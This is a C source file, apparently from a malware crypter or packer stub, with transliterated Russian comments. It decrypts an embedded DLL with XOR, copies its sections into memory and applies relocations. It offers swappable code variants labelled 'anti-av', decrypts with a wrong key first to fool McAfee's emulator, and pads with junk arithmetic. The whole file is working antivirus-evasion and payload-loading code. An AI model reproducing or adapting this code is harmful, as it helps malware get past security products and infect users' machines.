
//----- INFCODE C-PROCEDURE

// push    ebp
// mov     ebp, esp
//
// ...
//
// C9 leave  == mov    esp,ebp  
//           == pop    ebp
// C3 retn

//
// !!! dla testa novogo varianta define, commentim ostalnie i compilim
//

//anti-av: select only 1 define

//#define CCDLL_P1
//#define CCDLL_P2
#define CCDLL_P3

//#define CCDLL_V1
//#define CCDLL_V2
#define CCDLL_V3

//#define CCXOR_V1
//#define CCXOR_V2
//#define CCXOR_V3
//#define CCXOR_V4
//#define CCXOR_V5
//#define CCXOR_V6
//#define CCXOR_V7
#define CCXOR_V8

//#define CCTCOPY_V1
//#define CCTCOPY_V2
#define CCTCOPY_V3

//#define CCDCOPY_V1
//#define CCDCOPY_V2
#define CCDCOPY_V3

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

static void C_CODE_NG() 
{
	FIXUP_BLOCK *fb;
	DWORD o, dcount, dll_imagebase;

	DWORD dll_text_rva;
	DWORD dll_data_rva;
	unsigned char *b;              //@E
	
	unsigned char *dll_text, *new_dll_text;
	unsigned char *dll_data, *new_dll_data; 

	// 0x60 'pushad' will be first opcode

	//--- decrypt dll

	#ifdef CCDLL_P1
	 unsigned char *dll; //@S
	 DWORD xorkey;
	 DWORD dll_len;      //@E 
	#endif
	//
	#ifdef CCDLL_P2
	 unsigned char *dll=0; //@S
	 DWORD xorkey; 
	 DWORD dll_len=0;      //@E 
	#endif
	//
	#ifdef CCDLL_P3
	 unsigned char *dll; //@S
	 DWORD xorkey=0; 
	 DWORD dll_len;      //@E 
	#endif

	#ifdef CCDLL_V1
	 dll=(LPSTR)0xFEFEFEFE; //@S             // dll, slagaemoe1
	 dll_len=0xF1F1F1F1;    //@E             // dll_len, slagaemoe1
	 dll+=0xFEFEFEFE;         //@S           // dll, slagaemoe2
	 dll_len+=0xF1F1F1F1;                    // dll_len, slagaemoe2
	 xorkey=0xF0F0F0F0;       //@E           // xorkey
	#endif
	//
	#ifdef CCDLL_V2
	 dll=(LPSTR)0xFEFEFEFE;                    // dll, slagaemoe1
	 dll+=0xFEFEFEFE;         //@S             // dll, slagaemoe2
	 xorkey=0xF0F0F0F0;                        // xorkey
	 dll_len=0xF1F1F1F1;      //@E             // dll_len, slagaemoe1
	 dll_len+=0xF1F1F1F1;                      // dll_len, slagaemoe2
	#endif
	//
	#ifdef CCDLL_V3
	 xorkey=0xF0F0F0F0;       //@S             // xorkey
	 dll=(LPSTR)0xFEFEFEFE;   //@E             // dll, slagaemoe1
	 dll+=0xFEFEFEFE;          //@S            // dll, slagaemoe2
	 dll_len=0xF1F1F1F1;       //@E            // dll_len, slagaemoe1
	 dll_len+=0xF1F1F1F1;                      // dll_len, slagaemoe2
	#endif

	                     // ETO VREMENNAYA MERA, NADO RAZBIRATSYA CHTO ON PALIT V RASHIFROVANNOI DLL
	dcount=0; //@S // ANTI-MCAFEE EMUL decrypt counter
	xorkey--;       //@E // for ANTI-MCAFEE EMUL: on 1st iteration decrypt with wrong key
	                     // emul will got wrong dll content
	dexor:;

	//@S
	#ifdef CCXOR_V1
	 for (DWORD i=3;i<dll_len;i++) dll[i]^=(BYTE)xorkey; 
	#endif
	//
	#ifdef CCXOR_V2
	 for (DWORD i=3;;i++) { if (i>=dll_len) break; dll[i]^=(BYTE)xorkey; };
	#endif
	//
	#ifdef CCXOR_V3
	 for (DWORD i=dll_len-1;i>2;i--) dll[i]^=(BYTE)xorkey; 
	#endif
	//
	#ifdef CCXOR_V4
	 for (DWORD i=dll_len-1;;i--) { if (i<=3) break; dll[i]^=(BYTE)xorkey; };
	#endif
	//
	#ifdef CCXOR_V5
	{ DWORD i=3; loop5:; dll[i]^=(BYTE)xorkey; i++; if (i<dll_len) goto loop5; }
	#endif
	//
	#ifdef CCXOR_V6
	{ DWORD i=dll_len-1; loop6:; dll[i]^=(BYTE)xorkey; i--; if (i>3) goto loop6; }
	#endif
	//
	#ifdef CCXOR_V7
	 DWORD i=3; loop7:; dll[i]^=(BYTE)xorkey; i++; if (i>=dll_len) goto done7; goto loop7; done7:;
	#endif
	//
	#ifdef CCXOR_V8
	{ DWORD i=3; loop8:; if (i>=dll_len) goto done8; dll[i]^=(BYTE)xorkey; i++; goto loop8; done8:; }
	#endif

	//---copy .text section to new location

	dll_text	 = (LPSTR)0xFDFDFDFD;      
	new_dll_text = (LPSTR)0xFBFBFBFB;    
	//@E

	dcount++;                 // from dcount==finished iteration number
	if (dcount==2) xorkey++;  // after 2nd interation - restore the correct xorkey

	if (dcount<3) goto dexor; // 1st iteration - xor with wrong xorkey
	                          // 2nd iteration - xor with wrong key again
	                          // 3d  iteration - xor with correct key
	//@S
	#ifdef CCTCOPY_V1
	 for (DWORD q=0;q<0xFCFCFCFC;q++) new_dll_text[q]=dll_text[q]; // 0xFCFCFCFC == dll_text_psize
	#endif
	//
	#ifdef CCTCOPY_V2
	 for (DWORD q=0;;q++) { if (q>=0xFCFCFCFC) break; new_dll_text[q]=dll_text[q]; }; // 0xFCFCFCFC == dll_text_psize
	#endif
	//
	#ifdef CCTCOPY_V3
	{ DWORD q=0; tloop3:; new_dll_text[q]=dll_text[q]; q++; if (q < 0xFCFCFCFC) goto tloop3; }
	#endif

	//---copy .data section to new location

	dll_data =	   (LPSTR)0xFAFAFAFA;     
	new_dll_data = (LPSTR)0xF8F8F8F8;              
	//@E

	//@S
	#ifdef CCDCOPY_V1
	 for (DWORD w=0;w<0xF9F9F9F9;w++) new_dll_data[w]=dll_data[w]; // 0xF9F9F9F9 == dll_data_psize
	#endif
	//
	#ifdef CCDCOPY_V2
	 for (DWORD w=0;;w++) { if (w>=0xF9F9F9F9) break; new_dll_data[w]=dll_data[w]; }; // 0xF9F9F9F9 == dll_data_psize
	#endif
	//
	#ifdef CCDCOPY_V3
	{ DWORD w=0; dloop3:; new_dll_data[w]=dll_data[w]; w++; if (w < 0xF9F9F9F9) goto dloop3;}
	#endif

	//---FIXUP sections

	dll_imagebase = 0xF5F5F5F5;     
	fb = (LPVOID)0xF7F7F7F7; // 0xF7F7F7F7 == reloc_vadr
	//@E 

	nextfb:;
	 dll_text_rva = 0xF3F3F3F3; //@S
	 dll_data_rva = 0xF2F2F2F2;

	 // --- Process TypeOffset Entries (each entry==1 WORD) inside FixupBlock

	 for (o = 0; o < fb->BlockSize; o += 2)
	 {
		  wMEMORY *wmem;
		  WORD TypeOffset;
		  DWORD Type, Offset, delta;

		  b = new_dll_text - dll_text_rva;                    //@S // new dll imagebase vadr 
		  wmem=(LPVOID)(/*@S+*/o+8+(DWORD)fb/*@E*/); //@E
		  TypeOffset=wmem->word0;   

		  if (/*@S==*/TypeOffset == 0/*@E*/) break;      //@S // fixupblock end
		  Type   = TypeOffset >> 12;                       // type of reloc
		  Offset = TypeOffset << 4; 
		  Offset = Offset >> 4; //@E // offset since PageRVA

		  if (/*@S&&*/(Offset == 0) && (o != 0)/*@E*/) break;  //@S // fixupblock end
		  delta = (DWORD)b - dll_imagebase;                //@E // 32bit delta

// old:
//   DWORD dllVA=/*@S+*/dll_imagebase + fb->PageRVA + Offset/*@E*/;  // dll virt.addr
//   DWORD exeVA=/*@S+*/(DWORD)b + fb->PageRVA + Offset/*@E*/;       // exe virt.addr
//   DWORD delta=exeVA-dllVA;  //32bit delta

		  if (/*@S==*/Type == 3/*@E*/) // +32bit delta
		  {
			dMEMORY *dmem = &b[/*@S+*/fb->PageRVA + Offset/*@E*/];
			dmem->dword0  = /*@S+*/dmem->dword0 + delta/*@E*/;
		  }
	 }

  next:;
  fb = (LPVOID)(/*@S+*/fb->BlockSize + (DWORD)fb/*@E*/);

 if ((DWORD)fb < 0xF4F4F4F4) goto nextfb; //reloc_vadr + dll_fixupsize

 //--- TRASH (JUST MAKE SOME BUFFER)
 {
	 DWORD x = (5000); //@S
	 DWORD y = (1096); //@E
	 //@S
	 x *= /*@S+*/ y + 3 /*@E*/;  
	 x += /*@S+*/ x + y + 8 /*@E*/; 
	 y += (164);
	 y *= (23);    
	 //@E
 } 
}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif
